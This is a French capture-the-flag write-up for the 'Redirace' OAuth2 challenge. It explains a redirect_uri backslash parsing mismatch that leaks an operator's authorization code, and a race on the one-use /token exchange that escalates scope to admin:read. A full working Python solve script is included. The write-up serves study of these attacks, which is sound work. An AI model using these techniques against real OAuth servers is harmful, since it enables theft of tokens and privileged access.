# Redirace — Writeup

## Énoncé (HTL)

- **Titre :** Redirace
- **Catégorie :** webex
- **Points :** 643
- **Solves :** 64
- **Connexion :** `http://web.ctf.yogosha.com:8004`

> PassGate is an in-house OAuth2 authorization server and resource API for an admin
> console. The first-party client `passgate-console` uses pushed authorization
> requests, and an internal operator approves pending requests on a tight loop.
> The flag sits behind `/resource`, readable only with the scope `admin:read`,
> which the front channel will never hand you. Steal the operator's authorization
> and turn it into a token you were never meant to hold.

## Protections / modèle

- Serveur OAuth2 maison (`authapi/app.py`) + base SQLite (`db.py`).
- Flux : `POST /par` (*pushed authorization request*) → l'opérateur interne (bot)
  connecté approuve via `GET /authorize?request_uri=...` → redirection avec le
  **code** vers la `redirect_uri` → `POST /token` → `GET /resource`.
- Le client `passgate-console` (`db.py`) :
  - `allowed_scopes = "openid profile admin:read"`
  - `frontchannel_scopes = "openid profile"`  ← **jamais** `admin:read`
  - `redirect_hosts = "console.passgate.htl"`
- `/resource` exige le scope `admin:read` dans le JWT.
- Le code est émis au nom du **sujet `admin`** (le bot), mais avec les *frontchannel
  scopes* seulement → pas d'`admin:read`. Et la redirection part chez le bot, pas
  chez nous.

Deux problèmes : (1) **intercepter** le code de l'opérateur, (2) **transformer** ce
code en token avec `admin:read`.

## Vulnérabilité 1 : discordance de parsing de `redirect_uri`

`urltools.py` valide et reconstruit l'URL avec deux logiques différentes :

```python
# validate : replie les '\' en '/' AVANT de lire l'hôte
def _browser_host(uri):
    normalized = uri.replace("\\", "/")
    return urlsplit(normalized).hostname          # -> console.passgate.htl (autorisé)

# build_redirect : garde le '\' tel quel
def build_redirect(uri, params):
    parts = urlsplit(uri)                          # '\' -> traité comme userinfo
    host = parts.hostname or ""                    # -> collector.passgate.htl
```

Avec `redirect_uri = http://console.passgate.htl\@collector.passgate.htl:8004/cb` :

- **validate** voit l'hôte `console.passgate.htl` → **autorisé** ;
- **build_redirect** voit `console.passgate.htl\` comme *userinfo* et l'hôte réel
  devient `collector.passgate.htl:8004/cb`.

Or `/cb` est le **callback inspector** : pour un hôte hors production, il **stocke**
les paramètres reçus (dont le `code`), consultables via `GET /inspect?state=...`.
Le bot suit la redirection (`allow_redirects=True`) → le code de l'opérateur atterrit
dans l'inspecteur, qu'on peut lire.

## Vulnérabilité 2 : course (*race*) sur `/token` → élévation de scope

À l'échange du code (`app.py`), la logique d'octroi des scopes est à double branche :

```python
if code in LIVE_GRANTS:
    base = LIVE_GRANTS[code]
    effective = (requested or base) & allowed          # <-- borné par allowed (admin:read!)
else:
    LIVE_GRANTS[code] = set(granted)
    effective = (requested & granted) if requested else set(granted)  # borné par granted (front)
```

- 1ᵉʳ passage : `effective` est limité à `granted` (front-channel, sans `admin:read`).
- 2ᵉ passage : `effective` est borné par **`allowed`**, qui contient `admin:read`.

Mais le code est **à usage unique** (`mark_code_used`). La fenêtre vient du fait que
la vérification `row["used"]` et le marquage sont **séparés** : en lançant **deux
`/token` simultanés** sur le même code, les deux passent le contrôle `used==0`
avant le marquage. L'un amorce `LIVE_GRANTS[code]`, l'autre bascule dans la branche
`code in LIVE_GRANTS` et calcule `requested & allowed` → **`admin:read`**.
D'où le nom *Redi-race*.

Bonus : en **n'envoyant pas** de `code_challenge` au `/par`, la vérification PKCE est
sautée côté `/token` (`if row["code_challenge"]:` est faux).

## Résolution pas à pas

1. Pousser la requête d'autorisation avec la `redirect_uri` piégée, sans PKCE :

```python
redirect_uri = "http://console.passgate.htl\\@collector.passgate.htl:8004/cb"
# POST /par  ->  {"request_uri": "urn:passgate:par:..."}
```

2. Attendre que le bot approuve ; récupérer le code capturé par l'inspecteur :

```python
# GET /inspect?state=<notre state>  ->  {"captures": [{"code": "...", ...}]}
```

3. Lancer **deux** `/token` en parallèle sur le même code, en demandant `admin:read` :

```python
import threading
def hit(tag):
    out[tag] = post("/token", {"grant_type": "authorization_code",
                               "code": code, "scope": "admin:read"})
t1 = threading.Thread(target=hit, args=("A",)); t2 = threading.Thread(target=hit, args=("B",))
t1.start(); t2.start(); t1.join(); t2.join()
# l'un des deux renvoie scope="admin:read"
```

4. Utiliser ce token sur `/resource` :

```python
# Authorization: Bearer <token admin:read>  ->  {"flag": "HTL{...}", "subject": "admin"}
```

## Script complet -> Script intégral

```python
#!/usr/bin/env python3
# Redirace / PassGate — split de redirect_uri + race de scope sur /token.
# Usage: python3 solve.py <host> <port>
#        python3 solve.py web.ctf.yogosha.com 8004
# Dépendances : aucune (stdlib)
import sys, json, time, threading, secrets
import urllib.request, urllib.parse, urllib.error

HOST = sys.argv[1] if len(sys.argv) > 1 else "web.ctf.yogosha.com"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8004
BASE = f"http://{HOST}:{PORT}"

def req(path, form=None, headers=None):
    data = urllib.parse.urlencode(form).encode() if form is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=headers or {})
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

def attempt():
    state = "st-" + secrets.token_hex(8)
    # Split de parsing : validate() lit console.passgate.htl (autorisé) après avoir
    # replié '\'->'/', mais build_redirect() garde le '\' et urlsplit() prend
    # console.passgate.htl\ comme userinfo -> le code part vers le collector (/cb).
    redirect_uri = "http://console.passgate.htl\\@collector.passgate.htl:8004/cb"
    _, body = req("/par", form={
        "client_id": "passgate-console",
        "redirect_uri": redirect_uri,
        "scope": "openid profile",      # pas de code_challenge -> PKCE non vérifié
        "state": state,
    })
    request_uri = json.loads(body)["request_uri"]
    print(f"[*] PAR poussé, request_uri={request_uri} state={state}")

    # L'opérateur interne (bot) approuve ; le code est capturé par l'inspecteur
    # car notre redirection vise un hôte hors production.
    code = None
    for _ in range(40):
        _, insp = req("/inspect?state=" + urllib.parse.quote(state))
        caps = json.loads(insp).get("captures", [])
        if caps and caps[0].get("code"):
            code = caps[0]["code"]; break
        time.sleep(0.5)
    if not code:
        print("[-] l'opérateur n'a pas approuvé à temps"); return None
    print(f"[+] code de l'opérateur capturé : {code}")

    # Race : deux /token sur le code à usage unique. L'un amorce LIVE_GRANTS avec
    # les scopes front-channel ; l'autre réévalue alors contre allowed_scopes du
    # client et accorde admin:read avant que le code ne soit marqué utilisé.
    out = {}
    def hit(tag):
        out[tag] = req("/token", form={
            "grant_type": "authorization_code",
            "code": code,
            "scope": "admin:read",
        })[1]
    ts = [threading.Thread(target=hit, args=(t,)) for t in ("A", "B")]
    [t.start() for t in ts]; [t.join() for t in ts]

    for tag, b in out.items():
        j = json.loads(b)
        print(f"[*] token[{tag}]: scope={j.get('scope')!r} err={j.get('error')}")
        if "admin:read" in (j.get("scope") or ""):
            return j["access_token"]
    return None

for rnd in range(1, 9):                 # on réessaie si la course est perdue
    print(f"===== tentative {rnd} =====")
    tok = attempt()
    if tok:
        _, res = req("/resource", headers={"Authorization": "Bearer " + tok})
        print("[*] /resource ->", res)
        flag = json.loads(res).get("flag")
        if flag:
            print("[+] Flag :", flag); sys.exit(0)
    time.sleep(1)

print("[-] échec"); sys.exit(1)
```

## Flag

```
HTL{race_the_redirect_for_scope}
```

*(Testé en local avec l'appli fournie — flag de dev `HTL{dev_default_redirace}`,
course gagnée dès le 1ᵉʳ tour — puis sur l'instance HTL qui renvoie le flag ci-dessus
(le vrai bot opérateur approuve la requête).)*
